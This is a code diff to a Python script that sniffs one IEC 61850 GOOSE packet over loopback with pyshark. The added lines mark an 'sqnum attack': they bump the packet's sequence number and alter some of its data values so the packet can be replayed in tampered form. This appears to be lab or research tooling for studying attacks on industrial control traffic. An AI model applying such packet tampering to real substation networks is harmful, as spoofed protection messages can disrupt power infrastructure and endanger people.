@@ -5,6 +5,7 @@ import pyshark
 from socket import socket, AF_PACKET, SOCK_RAW
 
 import sys
+import templateattacks
 
 
 ininterface="lo"
@@ -52,14 +53,7 @@ def LFC(str):
     #used to create the object used to change variable names
     return pyshark.packet.fields.LayerFieldsContainer(str)
 
-# taken from mdehus's goose-IEC61850-scapy repo
-# GPL-2.0
-# https://github.com/mdehus/goose-IEC61850-scapy
 
-
-
-
-#sort out endianness (needs to be big)
 
 # todo - add try except for capturing ctrl-c
 # add vlan support
@@ -69,6 +63,7 @@ cap=pyshark.LiveCapture(interface="lo",bpf_filter="ether proto 0x88b8",include_r
 cap.sniff(packet_count=1)
 
 inpacket=cap[0]
+
 # sniff will try to get packets from network, count=1 means get 1 packet then finish
 #iface is the interface targetted, filter is a BPF (Berkely Packet Filter 
 # https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)
@@ -77,7 +72,31 @@ inpacket=cap[0]
 
 ##edit packet between here
 
+#sqnum attack
+print("Original sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])
+c=int(inpacket.goose.goosePdu_element.sqNum_raw[0],16)+1
+c=format(c,'x')
 
+d=""
+for i in range(0,len(inpacket.goose.goosePdu_element.sqNum_raw[0])-len(str(c))):
+    d+="0"
+d+=str(c)
+
+
+inpacket.goose.goosePdu_element.sqNum_raw[0]=LFC(d)
+print("New sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])
+
+#change some data
+
+#print(inpacket.goose.goosePdu_element.allData_tree.Data_raw)
+for element in inpacket.goose.goosePdu_element.allData_tree.Data_raw:
+    if (element[2]=='2'):
+        
+        pad=str(element[0][0])+'4'
+        pad+='10'
+        print(pad)
+        element[0]=LFC(pad)
+        
 
 ##and here
 
@@ -100,7 +119,7 @@ inpacket=cap[0]
 counter=0
 databytes=bytearray()
 for element in inpacket.goose.goosePdu_element.allData_tree.Data:
-    databytes+=DataToBytesRaw(int(element)+128)
+    databytes+=DataToBytesRaw(int(element)+128) #the BER code
     databytes+=DataToBytesRaw(int(inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][2]))
     databytes+=bytearray.fromhex(inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0])
     counter+=1
@@ -110,8 +129,6 @@ inpacket.goose.goosePdu_element.allData_raw[0].raw_value=databytes
 
 #set put correct value for number of entries in
 inpacket.goose.goosePdu_element.numDatSetEntries_raw[2].raw_value=str(counter)
-
-inpacket.goose.goosePdu_element_raw[0]
 
 #todo, get the extra stuff after pdu
 
